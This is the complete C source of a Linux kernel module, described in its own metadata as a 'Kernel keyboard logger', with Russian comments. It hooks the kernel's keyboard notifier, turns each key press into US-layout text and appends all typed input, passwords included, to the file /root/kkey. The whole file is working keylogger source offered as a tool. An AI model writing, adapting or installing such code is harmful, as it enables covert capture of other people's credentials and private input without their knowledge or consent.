#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/stat.h>
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <linux/workqueue.h>
#include <linux/slab.h>
#include <linux/errno.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Lebedev Denis");
MODULE_DESCRIPTION("Kernel keyboard logger");
MODULE_VERSION("1.1");

#define MAX_BUFFER_SIZE     256
#define TMP_BUFF_SIZE       16
#define LOG_FILE_PATH     "/root/kkey"

struct keyboard_logger {
    struct file *log_file;
    struct notifier_block keyboard_notifier;
    struct work_struct writer_task;
    
    char *keyboard_buffer;
    char *write_buffer;
    
    size_t buffer_offset;
    size_t buffer_len;
    loff_t file_off;

    char side_buffer[MAX_BUFFER_SIZE];
    char back_buffer[MAX_BUFFER_SIZE];
};

static void write_log_task(struct work_struct *work);
static size_t keycode_to_us_string(int keycode, int shift, char *buffer, size_t buff_size);
static void flush_buffer(struct keyboard_logger *klogger);

// --- Карта раскладки (US) ---
static const char *us_keymap[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},
	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},
	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},
	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},
	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},
	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},
	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"}, 
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},
	{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, 
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},
	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},
	{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"_F1_", "_F1_"},
	{"_F2_", "_F2_"}, {"_F3_", "_F3_"}, {"_F4_", "_F4_"}, {"_F5_", "_F5_"},
	{"_F6_", "_F6_"}, {"_F7_", "_F7_"}, {"_F8_", "_F8_"}, {"_F9_", "_F9_"},
	{"_F10_", "_F10_"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},
	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, 
	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},
	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"}, 
	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, 
	{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},
	{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},  
	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"}, 
	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},
	{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, 
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"_PAUSE_", "_PAUSE_"},                                     
};

// --- Функция сброса буфера в задачу для записи ---
// Мьютексы и атомики не используются, чтобы избежать блокировок в контексте ядра.
// Иначе вся операционная система просто зависнет при попытке захвата мьютекса в обработчике прерываний.
void flush_buffer(struct keyboard_logger *klogger)
{
    char *tmp = klogger->keyboard_buffer;
    klogger->keyboard_buffer = klogger->write_buffer;
    klogger->write_buffer = tmp;
    klogger->buffer_len = klogger->buffer_offset;
    
    schedule_work(&klogger->writer_task);
    
    memset(klogger->keyboard_buffer, 0x0, MAX_BUFFER_SIZE);
    klogger->buffer_offset = 0;
}

// --- Функция преобразования код-клавиши в строку ---
size_t keycode_to_us_string(int keycode, int shift, char *buffer, size_t buff_size)
{
    const int keymap_size = sizeof(us_keymap) / sizeof(us_keymap[0]);
    
    memset(buffer, 0x0, buff_size);
    
	if (keycode > 0 && keycode > KEY_RESERVED && keycode < keymap_size) 
	{
		const char *us_key = (shift == 1) ? us_keymap[keycode][1] : us_keymap[keycode][0];
		snprintf(buffer, buff_size, "%s", us_key);
		return strlen(buffer);
	}
	
	return 0;
}

// --- Callback-функция для перехвата событий клавиатуры ---
int keyboard_callback(struct notifier_block *kblock, unsigned long action, void *data)
{
    struct keyboard_logger *klogger;
    struct keyboard_notifier_param *key_param;
    size_t keystr_len = 0;
    char tmp_buff[TMP_BUFF_SIZE];
    
    klogger = container_of(kblock, struct keyboard_logger, keyboard_notifier);
    key_param = (struct keyboard_notifier_param *)data;
    
    // Обрабатываем только нажатия клавиш
	if (!(key_param->down) || (keystr_len = keycode_to_us_string(key_param->value, key_param->shift, tmp_buff, TMP_BUFF_SIZE)) < 1)
		return NOTIFY_OK;
	
	if (tmp_buff[0] == '\n')
	{
		if (klogger->buffer_offset < MAX_BUFFER_SIZE - 1) {
			klogger->keyboard_buffer[klogger->buffer_offset++] = '\n';
		}
		flush_buffer(klogger);
		return NOTIFY_OK;
	}
	
	if ((klogger->buffer_offset + keystr_len) >= MAX_BUFFER_SIZE - 1)
		flush_buffer(klogger);
	
	strncpy(klogger->keyboard_buffer + klogger->buffer_offset, tmp_buff, keystr_len);
	klogger->buffer_offset += keystr_len;
    
    return NOTIFY_OK;
}

// --- Задача, выполняющая запись в файл ---
void write_log_task(struct work_struct *work)
{
    struct keyboard_logger *klogger;
    ssize_t bytes_written;
    
    klogger = container_of(work, struct keyboard_logger, writer_task);
    
    bytes_written = kernel_write(klogger->log_file, klogger->write_buffer, klogger->buffer_len, &klogger->file_off);
    if (bytes_written < 0) {
        pr_err("kkey: Failed to write to log file, error %zd\n", bytes_written);
    }
}

static struct keyboard_logger *klogger;

// --- Функция инициализации модуля ---
static int __init k_key_logger_init(void)
{
    int err;

    klogger = kzalloc(sizeof(struct keyboard_logger), GFP_KERNEL);
    if (!klogger) {
        pr_err("kkey: Unable to allocate memory\n");
        return -ENOMEM;
    }
    
    klogger->log_file = filp_open(LOG_FILE_PATH, O_CREAT | O_WRONLY | O_APPEND, 0600);
    if (IS_ERR(klogger->log_file)) {
		pr_err("kkey: Unable to create or open log file: %s\n", LOG_FILE_PATH);
        err = PTR_ERR(klogger->log_file);
        kfree(klogger);
    	return err;
	}

	klogger->keyboard_buffer = klogger->side_buffer;
	klogger->write_buffer = klogger->back_buffer;
	
	klogger->keyboard_notifier.notifier_call = keyboard_callback;
	err = register_keyboard_notifier(&klogger->keyboard_notifier);
    if (err) {
        pr_err("kkey: Failed to register keyboard notifier\n");
        filp_close(klogger->log_file, NULL);
        kfree(klogger);
        return err;
    }

	INIT_WORK(&klogger->writer_task, write_log_task);

	return 0;	
}

// --- Функция выгрузки модуля ---
static void __exit k_key_logger_exit(void)
{
	unregister_keyboard_notifier(&klogger->keyboard_notifier);
    cancel_work_sync(&klogger->writer_task);
    
    if (klogger) {
        if (!IS_ERR(klogger->log_file)) {
            filp_close(klogger->log_file, NULL);
        }
        kfree(klogger);
    }
}

module_init(k_key_logger_init);
module_exit(k_key_logger_exit);
